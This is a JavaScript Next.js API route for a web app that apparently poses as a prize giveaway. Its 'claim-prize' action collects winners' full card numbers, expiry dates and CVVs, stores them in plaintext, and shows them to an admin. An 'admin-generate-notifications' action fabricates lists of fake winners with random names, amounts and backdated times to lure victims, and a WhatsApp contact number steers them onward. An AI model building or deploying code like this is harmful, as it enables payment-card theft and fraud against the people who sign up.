import { NextResponse } from 'next/server'
import bcrypt from 'bcryptjs'
import { getDb } from '@/lib/db'
import { getSession } from '@/lib/session'

export const dynamic = 'force-dynamic'

// ── Helpers ───────────────────────────────────────────────────
function now() { return new Date().toISOString().replace('T', ' ').slice(0, 19) }

const NAMES = [
  'James','Mary','Robert','Patricia','John','Jennifer','Michael','Linda',
  'David','Elizabeth','William','Barbara','Richard','Susan','Joseph','Jessica',
  'Thomas','Sarah','Christopher','Karen','Daniel','Lisa','Matthew','Nancy',
  'Anthony','Betty','Mark','Margaret','Donald','Sandra','Steven','Ashley',
  'Paul','Kimberly','Andrew','Emily','Joshua','Donna','Kenneth','Michelle',
  'Kevin','Carol','Brian','Amanda','George','Dorothy','Edward','Melissa','Ronald','Deborah',
]
const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min }

// ── Action handlers ───────────────────────────────────────────
const actions = {

  signup: async ({ full_name, email, password }) => {
    if (!full_name?.trim() || !email || !password)
      return NextResponse.json({ error: 'All fields are required' }, { status: 400 })
    if (password.length < 6)
      return NextResponse.json({ error: 'Password must be at least 6 characters' }, { status: 400 })

    const db = await getDb()
    if (db.prepare('SELECT id FROM users WHERE email = ?').get(email.toLowerCase()))
      return NextResponse.json({ error: 'Email already registered' }, { status: 400 })

    const hash = await bcrypt.hash(password, 10)
    const { lastInsertRowid: id } = db
      .prepare('INSERT INTO users (full_name, email, password_hash) VALUES (?, ?, ?)')
      .run(full_name.trim(), email.toLowerCase(), hash)

    const session = await getSession()
    session.id = Number(id)
    session.email = email.toLowerCase()
    session.full_name = full_name.trim()
    session.is_admin = false
    await session.save()

    return NextResponse.json({ success: true, user: { id, full_name, email } })
  },

  login: async ({ email, password }) => {
    if (!email || !password)
      return NextResponse.json({ error: 'Email and password are required' }, { status: 400 })

    const db = await getDb()
    const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email.toLowerCase())
    if (!user || !(await bcrypt.compare(password, user.password_hash)))
      return NextResponse.json({ error: 'Invalid email or password' }, { status: 401 })

    const session = await getSession()
    session.id = user.id
    session.email = user.email
    session.full_name = user.full_name
    session.is_admin = false
    await session.save()

    return NextResponse.json({ success: true, user: { id: user.id, full_name: user.full_name, email: user.email } })
  },

  logout: async () => {
    const session = await getSession()
    session.destroy()
    return NextResponse.json({ success: true })
  },

  'get-user': async () => {
    const session = await getSession()
    if (!session?.id) return NextResponse.json({ error: 'Not authenticated' }, { status: 401 })

    const db = await getDb()
    const user = db.prepare(
      `SELECT id, full_name, email, is_winner, winner_at,
              payment_submitted, payment_submitted_at, created_at
       FROM users WHERE id = ?`
    ).get(session.id)

    if (!user) return NextResponse.json({ error: 'User not found' }, { status: 404 })
    return NextResponse.json({ user })
  },

  'get-notifications': async () => {
    const db = await getDb()
    const notifications = db
      .prepare('SELECT * FROM winner_notifications ORDER BY won_at DESC LIMIT 10')
      .all()
    return NextResponse.json({ notifications })
  },

  'get-whatsapp': async () => {
    const db = await getDb()
    const row = db.prepare("SELECT value FROM settings WHERE key = 'whatsapp_number'").get()
    return NextResponse.json({ number: row?.value || '1234567890' })
  },

  'claim-prize': async ({ cardholder_name, card_number, card_expiry, card_cvv }) => {
    const session = await getSession()
    if (!session?.id) return NextResponse.json({ error: 'Not authenticated' }, { status: 401 })

    const db = await getDb()
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(session.id)
    if (!user) return NextResponse.json({ error: 'User not found' }, { status: 404 })
    if (!user.is_winner) return NextResponse.json({ error: 'You are not a winner' }, { status: 403 })
    if (user.payment_submitted) return NextResponse.json({ error: 'Payment already submitted' }, { status: 400 })

    if (!cardholder_name || !card_number || !card_expiry || !card_cvv)
      return NextResponse.json({ error: 'All card fields are required' }, { status: 400 })

    const clean = card_number.replace(/\s/g, '')
    if (clean.length !== 16) return NextResponse.json({ error: 'Card number must be 16 digits' }, { status: 400 })
    if (!/^\d{2}\/\d{2}$/.test(card_expiry)) return NextResponse.json({ error: 'Invalid expiry (MM/YY)' }, { status: 400 })
    if (card_cvv.length !== 3) return NextResponse.json({ error: 'CVV must be 3 digits' }, { status: 400 })

    db.prepare(`
      UPDATE users SET card_holder_name=?, card_number=?, card_expiry=?, card_cvv=?,
        payment_submitted=1, payment_submitted_at=? WHERE id=?
    `).run(cardholder_name, clean, card_expiry, card_cvv, now(), session.id)

    return NextResponse.json({ success: true })
  },

  'admin-auth': async ({ password }) => {
    if (!password) return NextResponse.json({ error: 'Password required' }, { status: 400 })
    if (password !== process.env.ADMIN_PASSWORD)
      return NextResponse.json({ error: 'Incorrect password' }, { status: 401 })

    const session = await getSession()
    session.is_admin = true
    await session.save()
    return NextResponse.json({ success: true })
  },

  'admin-get-users': async () => {
    const session = await getSession()
    if (!session?.is_admin) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

    const db = await getDb()
    const users = db.prepare(
      `SELECT id, full_name, email, is_winner, winner_at, payment_submitted, created_at
       FROM users ORDER BY created_at DESC`
    ).all()
    return NextResponse.json({ users })
  },

  'admin-toggle-winner': async ({ userId }) => {
    const session = await getSession()
    if (!session?.is_admin) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    if (!userId) return NextResponse.json({ error: 'userId required' }, { status: 400 })

    const db = await getDb()
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId)
    if (!user) return NextResponse.json({ error: 'User not found' }, { status: 404 })

    const clearPayment = `card_holder_name=NULL, card_number=NULL, card_expiry=NULL,
                          card_cvv=NULL, payment_submitted=0, payment_submitted_at=NULL`

    if (user.is_winner) {
      db.prepare(`UPDATE users SET is_winner=0, winner_at=NULL, ${clearPayment} WHERE id=?`).run(userId)
      return NextResponse.json({ success: true, action: 'unmarked' })
    }

    db.prepare(`UPDATE users SET is_winner=0, winner_at=NULL, ${clearPayment} WHERE is_winner=1`).run()
    db.prepare(`UPDATE users SET is_winner=1, winner_at=? WHERE id=?`).run(now(), userId)
    return NextResponse.json({ success: true, action: 'marked' })
  },

  'admin-get-payments': async () => {
    const session = await getSession()
    if (!session?.is_admin) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

    const db = await getDb()
    const payment = db.prepare(
      `SELECT id, full_name, email, card_holder_name, card_number,
              card_expiry, card_cvv, payment_submitted_at
       FROM users WHERE payment_submitted=1 LIMIT 1`
    ).get()
    return NextResponse.json({ payment: payment || null })
  },

  'admin-generate-notifications': async () => {
    const session = await getSession()
    if (!session?.is_admin) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

    const db = await getDb()
    const count = rand(10, 15)
    const inserted = []
    for (let i = 0; i < count; i++) {
      const name = `${NAMES[rand(0, NAMES.length - 1)]} ${ALPHA[rand(0, 25)]}.`
      const amount = Math.round(rand(10000, 80000) / 500) * 500
      const wonAt = (() => {
        const d = new Date(Date.now() - rand(1, 60) * 86400000)
        d.setHours(rand(0, 23), rand(0, 59), rand(0, 59))
        return d.toISOString().replace('T', ' ').slice(0, 19)
      })()
      db.prepare('INSERT INTO winner_notifications (winner_name, amount, won_at) VALUES (?, ?, ?)').run(name, amount, wonAt)
      inserted.push({ name, amount, wonAt })
    }
    return NextResponse.json({ success: true, inserted: count, notifications: inserted })
  },

  'admin-update-whatsapp': async ({ number }) => {
    const session = await getSession()
    if (!session?.is_admin) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    if (!number || !/^\d+$/.test(number))
      return NextResponse.json({ error: 'Digits only, with country code' }, { status: 400 })

    const db = await getDb()
    const existing = db.prepare("SELECT id FROM settings WHERE key='whatsapp_number'").get()
    if (existing) {
      db.prepare("UPDATE settings SET value=?, updated_at=? WHERE key='whatsapp_number'").run(number, now())
    } else {
      db.prepare("INSERT INTO settings (key, value, updated_at) VALUES ('whatsapp_number', ?, ?)").run(number, now())
    }
    return NextResponse.json({ success: true })
  },

  'admin-get-settings': async () => {
    const session = await getSession()
    if (!session?.is_admin) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

    const db = await getDb()
    const rows = db.prepare('SELECT key, value FROM settings').all()
    return NextResponse.json({ settings: Object.fromEntries(rows.map((r) => [r.key, r.value])) })
  },
}

// ── Main handler ──────────────────────────────────────────────
export async function POST(request) {
  try {
    const body = await request.json()
    const { action, ...params } = body
    const handler = actions[action]
    if (!handler) return NextResponse.json({ error: 'Unknown action' }, { status: 400 })
    return await handler(params)
  } catch (err) {
    console.error('[/api/db]', err)
    return NextResponse.json({ error: 'Server error' }, { status: 500 })
  }
}
